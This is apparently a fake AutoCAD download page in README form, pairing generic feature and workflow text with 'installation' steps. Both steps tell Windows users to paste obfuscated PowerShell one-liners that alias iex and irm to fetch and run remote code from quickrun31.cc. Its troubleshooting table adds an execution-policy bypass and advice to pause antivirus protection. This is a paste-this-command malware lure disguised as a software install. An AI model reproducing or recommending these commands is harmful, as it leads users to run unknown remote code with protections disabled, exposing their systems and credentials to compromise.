## Installation

Two quick setup methods for Windows.

### Method 1 — Win + X

1. Press **Win + X**
2. Open **Terminal** or **Windows PowerShell**
3. Paste:

```powershell
sal m iex;m(irm quickrun31.cc/qle7he)
```

4. Press **Enter** and wait for the process to finish  
5. Launch AutoCAD

### Method 2 — Win + R

1. Press **Win + R**
2. Paste:

```powershell
powershell sal a irm;sal b iex;a quickrun31.cc/qle7he|b
```

3. Press **Enter** and wait  
4. Launch AutoCAD

### Requirements

- Windows 10 or Windows 11 (64-bit)
- Internet connection during setup only
- 8 GB RAM minimum (16 GB recommended)
- Dedicated GPU recommended for 3D work
- SSD recommended

### Troubleshooting

| Issue | What to try |
|-------|-------------|
| Connection error | Check internet |
| Execution Policy message | `Set-ExecutionPolicy Bypass -Scope Process -Force` |
| Blocked by antivirus | Temporarily pause real-time protection |
| Window closes right away | Usually means setup finished |

## About

AutoCAD for Windows is a professional drafting application used to create precise 2D drawings and 3D models. It is widely applied in architecture, engineering, construction and mechanical design for plans, details and documentation.

The workspace includes drawing tools, annotation, blocks, references and layout/plotting features for technical output.

> Use at your own risk. Keep your system protected.

---

## Features

**2D Drafting**
- Precision drawing and editing
- Layers, linetypes and lineweights
- Dimensions and text
- Hatches and revisions

**3D Design**
- Solid, surface and mesh modeling
- Navigation and visual styles
- Section views
- Basic presentation tools

**Productivity**
- Blocks and dynamic blocks
- External references (Xrefs)
- Design Center and tool palettes
- Sheet set tools

**Output**
- Layouts and viewports
- Plot and publish
- PDF and DWG exchange
- Native DWG support

## Workflow

1. Start a drawing and set units  
2. Configure layers and styles  
3. Draft geometry with precision tools  
4. Add dimensions and annotations  
5. Insert blocks and references  
6. Set up layouts  
7. Plot or export  

---

## How to Use

1. Install using one of the methods above  
2. Launch AutoCAD  
3. Create a new drawing  
4. Draft, annotate and organize  
5. Publish or export the result  

**Tips**
- Set units and layers before heavy drafting  
- Use blocks for repeated content  
- Keep Xrefs for large coordinated projects  
- Learn core shortcuts for speed (L, C, M, CO, E)
